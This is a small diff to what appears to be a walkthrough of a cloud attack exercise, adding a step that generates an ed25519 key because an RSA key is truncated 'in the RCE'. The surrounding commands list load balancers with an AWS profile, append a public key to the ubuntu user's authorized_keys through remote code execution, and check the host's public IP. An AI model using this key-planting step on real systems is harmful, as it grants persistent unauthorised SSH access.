@@ -10,6 +10,8 @@
 
 `aws elbv2 describe-load-balancers --profile Lara`
 
+`ssh-keygen -t ed25519` (An ed25519 key pair is necessary here because using an RSA public key is too long and gets truncated in the RCE)
+
 `echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys`
 
 `curl ifconfig.me`
